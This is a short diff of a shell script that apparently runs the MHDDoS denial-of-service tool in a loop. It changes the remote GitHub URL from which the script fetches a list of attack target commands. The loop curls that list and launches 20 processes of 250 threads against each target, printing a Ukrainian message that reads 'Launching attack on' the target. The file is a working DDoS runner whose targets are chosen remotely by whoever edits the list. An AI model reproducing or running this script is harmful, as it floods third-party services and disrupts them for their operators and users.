@@ -34,7 +34,7 @@ refresh_interval="15m"
 thread_count="250"
 process_count="20"
 stats_interval="60"
-url_with_targets="https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
+url_with_targets="https://raw.githubusercontent.com/sergqwer/auto_mhddos_target/main/runner_targets"
 
 # now enjoy the options in order and nicely split until we see --
 while true; do
@@ -120,7 +120,7 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
-      echo "Запускаємо атаку на $target_command, задіявши $process_count процесів, кожний з $thread_count потоками"
+      echo "Запускаємо атаку на $target_command"
 
       for (( i=1; i<=process_count; i++ ))
       do
